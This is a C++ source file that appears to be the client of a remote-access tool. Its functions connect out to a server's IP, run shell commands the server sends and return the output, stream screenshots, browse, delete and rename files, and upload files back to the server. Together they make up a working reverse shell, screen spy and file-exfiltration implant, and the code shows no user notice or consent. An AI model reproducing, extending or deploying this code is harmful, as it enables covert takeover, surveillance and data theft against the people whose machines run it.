#include "analyze.h"
#include "modes.h"
#include "tcp_socket.h"
#include "protocol.h"
#include "shell.h"
#include "explorer.h"
#include <thread>


void bMode_shell(json setting_s, unsigned int port){

    string ip = setting_s["ip"];
    // init
    tcp_socket pshell = tcp_socket(ip.c_str(), port);
    if (pshell.init_socket()!=0 || pshell.open_socket()!=0) {
		SETTING["rs:connect"] = 0;
		pshell.ts_cleanup();
		return;
    }

    while (SETTING["rs:connect"]){
        try{

            size_t lpacket_get = 0;
			// #2: get list with info & binary
			list<pair<size_t, char*>> list_packet = pshell.get_packet(lpacket_get);
			// #3: Make sure there isn't errors
			if (list_packet.size() == 0 || lpacket_get > MAX_LEN_PROTO) { deallocate_receive_proto(list_packet); break; }
			// #4: Take the list and concatenate into one packet
			char* packet = concatenate_to_char_ptr(list_packet, lpacket_get);
			// #5: analyzing this packet according to the following protocol
			pair<json, char*> _packet = GetBlockPacket(packet, lpacket_get);
			// #6: Make sure there isn't errors
			if (_packet.first == BLOCK_ERROR.first) { break; }
			// #7: len packet
			size_t lpacket_send = 0;
			// #8: command from server
			string command = _packet.first["cmd"];
			bool proxy = proxy_to_cmd(command);
            command = "\"\""+command+"\"\"";

            size_t length_out = 0;
			char* shell_stdout = run_pshell(command.c_str(), length_out, proxy);

			json info = json::parse("{}");
			char* packet_to_send = SetBlockPacket(info, shell_stdout, length_out, lpacket_send);
			// SUCCESS: send packet
			pshell.send_packet(packet_to_send, lpacket_send);
			// loop cleanup
			delete[] packet_to_send;
			delete[] _packet.second;
        }
        catch(exception&error){

        }
    }

    // cleanup
    pshell.ts_cleanup();
    SETTING["rs:connect"] = 0;
}


void bMode_shell_terminal(json setting_s, unsigned int port, const char* _app){
	string ip = setting_s["ip"];
	std::thread thrd([&] {socketPipeShell(ip.c_str(), port);});
	this_thread::sleep_for(.3s);
	thrd.detach(); 
}


void bMode_screen(json setting_s, unsigned int port, map<string, int>&main_setting){
	string ip = setting_s["ip"];
	tcp_socket screen = tcp_socket(ip.c_str(), port);
	pair<int, int>wSize;

	if (screen.init_socket() != 0 || screen.open_socket() != 0) {
		screen.ts_cleanup();
		main_setting["srcn:connect"] = 0;
		return;
	}

	json setting = SCREEN_S;

	while (main_setting["scrn:connect"]){
		wSize = GetWindowSize();
		pair<size_t, char*> image_buffer = get_img_24_bit_jpg(wSize.first, wSize.second, stoi(to_string(setting["quality"])));
		if (image_buffer.first == 0) {break;}
		// #: get setting
		size_t lpacket = 0;
		auto packet = screen.get_packet(lpacket);
		// empty packet
		if (packet.size() == 0 || lpacket > MAX_LEN_PROTO || lpacket == 0) {
			free(image_buffer.second);
			break;
		}

		char* _packet = concatenate_to_char_ptr(packet, lpacket);
		auto __ = GetBlockPacket(_packet, lpacket);
		setting = __.first;
		screen.send_packet(image_buffer.second, image_buffer.first);
		free(image_buffer.second);
		delete[] __.second;
	
		this_thread::sleep_for(chrono::milliseconds(stoi(to_string(setting["frm"]))));
	}

	screen.ts_cleanup();
	main_setting["scrn:connect"] = 0;

}


void bMode_screen_v2(json setting_s, unsigned int port, map<string, int>&main_setting){

	map<string, pair<size_t, char*>> package;
	pair<int, int>wSize;
	for (size_t i = 0; i < (SUM_BLOCKS * SUM_BLOCKS); i++) {
		package[to_string(i)] = make_pair(0, nullptr);
	}	

	string ip = setting_s["ip"];
	tcp_socket screen = tcp_socket(ip.c_str(), port);

	try{
		if (screen.init_socket() != 0 || screen.open_socket() != 0) {
			screen.ts_cleanup();
			main_setting["scrn:connect"] = 0;
			return;
		}
		json setting = json::parse(SCREEN_S.dump());
		
		while (main_setting["scrn:connect"]) {
			string quelity_str = to_string(setting["quality"]);
			size_t quelity = stoi(quelity_str);
			wSize = GetWindowSize();
			// get complete image from resource
			pair<size_t, list<pair<size_t, char*>>> image = set_X_parts_image(package, quelity, SUM_BLOCKS, wSize.first, wSize.second);
			// verify if image valid 
			if (image.first == 0) { break; }

			// wait for packet with setting
			size_t lgpacket = 0;
			auto setting_jpg = screen.get_packet(lgpacket);
			// verify size of packet bigger from 0
			if (lgpacket == 0) {deallocate_receive_proto(image.second); break; }
			// take the protocol to one char pointer 
			char* char_jpg = concatenate_to_char_ptr(setting_jpg, lgpacket);
			// convert to packet 
			auto json_jpg = GetBlockPacket(char_jpg, lgpacket);
			// verify if vaild 
			if (json_jpg == PACKET_ERROR) { break; }
			// extract setting of this mode and jpg
			setting = json::parse(json_jpg.first.dump());
			
			// send packet of this jsp setting to sync with server
			json sjson = { {"p_w", wSize.first}, { "p_h", wSize.second} };
			size_t lspacket = 0;
			char* send_jpg = SetBlockPacket(sjson, nullptr, 0, lspacket);
			screen.send_packet(send_jpg, lspacket);

			// #: get packet & deallocate (OK signal)
			auto __ = screen.get_packet(lspacket);
			deallocate_receive_proto(__);
			// #: send packet
			size_t image_size = image.first;
			char* simage = concatenate_to_char_ptr(image.second, image.first);
			screen.send_packet(simage, image_size);
			// #: deallocs from allocs
			delete[] send_jpg;
			delete[] json_jpg.second;
			delete[] simage;
			this_thread::sleep_for(chrono::milliseconds(stoi(to_string(setting["frm"]))));
		}

	}
	catch(exception&error){

	}
}



void bMode_explorer(json setting_s, unsigned int port, map<string, int>&main_setting){

	string ip = setting_s["ip"];
	tcp_socket explorer = tcp_socket(ip.c_str(), port);
	// #2: verify
	if (explorer.init_socket() != 0 || explorer.open_socket() != 0) {
		explorer.ts_cleanup();
		main_setting["expl:connect"] = 0;
		return;
	}

	while (main_setting["expl:connect"]){
		// #0: wait for first packet about action 
		size_t lpacket = 0;
		list<pair<size_t, char*>> packet = explorer.get_packet(lpacket);
		// #1: verify packet
		if (packet.size() == 0 || lpacket > MAX_LEN_PROTO) { deallocate_receive_proto(packet); break; }
		// #2: to one char* pointer
		char* pack_ptr = concatenate_to_char_ptr(packet, lpacket);
		// #3: struct follow protocol
		pair<json, char*> action = GetBlockPacket(pack_ptr, lpacket);
		// #4: verfiy valid or not
		if (action == BLOCK_ERROR) { break; }

		if (action.first["mode"] == "drives") {
			// #0: packet of list drive on system

			string fptuna(PEEP_NAME);
			json drives = listDrives(fptuna);
			size_t ldrv = drives.dump().length();
			size_t lpacket{ 0 };
			char* ch_drive = new char[ldrv+1];
			memcpy(ch_drive, drives.dump().c_str(), ldrv);
			ch_drive[ldrv] = '\0';
			char* pack_drive = SetBlockPacket(json::parse("{}"), ch_drive, ldrv, lpacket);
			explorer.send_packet(pack_drive, lpacket);
			// cleanup
			delete[] pack_drive;
		}
		else if (action.first["mode"] == "dir") {
			// #0: packet of listdir about files and folder
			string path = action.first["path"];
			json folder = listdir(path);
			string sfolder = folder.dump();
			size_t lfolder = sfolder.length();
			size_t lpacket =  0;
			// null terminate irrelavent
			char* ch_folder = new char[lfolder];
			memcpy(ch_folder, sfolder.c_str(), lfolder);
			char* pack_folder = SetBlockPacket(json::parse("{}"), ch_folder, lfolder, lpacket);
			explorer.send_packet(pack_folder, lpacket);
			// cleanup
			delete[] pack_folder;
			pack_folder = nullptr;
		}
		else if (action.first["mode"] == "del"){
			string _dpath = action.first["path"];
			json del = { {"deleted", delete_path(_dpath.c_str())}};
			size_t lpacket{ 0 };
			char* pack_del = SetBlockPacket(del, nullptr, 0, lpacket);
			explorer.send_packet(pack_del, lpacket);
			// cleanup
			delete[]pack_del;
		}
		else if (action.first["mode"] == "rename"){
			json rename = { {"renamed", rename_path(action.first["path"], action.first["newpath"])}};
			size_t lpacket{ 0 };
			char* pack_rename = SetBlockPacket(rename, nullptr, 0, lpacket);
			explorer.send_packet(pack_rename, lpacket);
			// cleanup
			delete[]pack_rename;
		}
		else if (action.first["mode"] == "edit"){
			json editor = { {"isfile", isValidFileToEdit(action.first["path"])}};
			size_t lpacket{ 0 };
			char* pack_edit = SetBlockPacket(editor, nullptr, 0, lpacket);
			explorer.send_packet(pack_edit, lpacket);
			// cleanup
			delete[] pack_edit;
		}

		delete[] action.second;

	}

	main_setting["expl:connect"] = 0;
	explorer.ts_cleanup();
}


void bMode_download(json setting_s, unsigned int port){

	string ip = setting_s["ip"];
	tcp_streamer download = tcp_streamer(ip.c_str(), port);
	// verify connect
	if (download.init_socket() != 0 || download.open_socket() != 0) {
		download.ts_cleanup();
		return;
	}

	while (port) {

		size_t lpacket;
		list<pair<size_t, char*>> pack_down = download.get_packet(lpacket);
		// valid?
		if (pack_down.size() == 0 || lpacket == 0) {
			break;
		}
		// follow protocol
		char* pack_ptr = concatenate_to_char_ptr(pack_down, lpacket);
		pair<json, char*> jpack = GetBlockPacket(pack_ptr, lpacket);

		// valid?
		if (jpack == BLOCK_ERROR) {
			break;
		}
		// cleanup to binary
		delete[]jpack.second;
		jpack.second = nullptr;

		if (jpack.first["action"] == "OPEN") {
			size_t lisread{ 0 };
			string f = jpack.first["f"];
			bool is_read = isValidFileToRead(f);
			cout << "f:" << f << " can read:" << is_read << endl;
			json tell_r_ser = { {"streaming", is_read}};
			char* pack_ask = SetBlockPacket(tell_r_ser, nullptr, 0, lisread);
			download.send_packet(pack_ask, lisread);
			// cleanup
			delete[] pack_ask;
			// shit-problem: out scope of protocol: OK signal
			char* tmp = new char[4];
			recv(download.lpeep, tmp, 4, 0);
			delete[]tmp;
			// end
			if (!is_read) { continue; }
			// #0: open new handle file
			pair<size_t, int> file_handle = openFile(jpack.first["f"]);
			if (file_handle.second == -1) {
				// big problem: have to reset mode
				break;
			}
			size_t lreadfile{ 0 };
			download.ReadFromFile(file_handle.second, download.lpeep, lreadfile);
			// cleanup
			close(file_handle.second);
				
		}
		else {
			delete[]jpack.second;
			break;
		}
	}

	// cleanup
	download.ts_cleanup();

	
}


void bMode_upload(json setting_s, unsigned int port){

}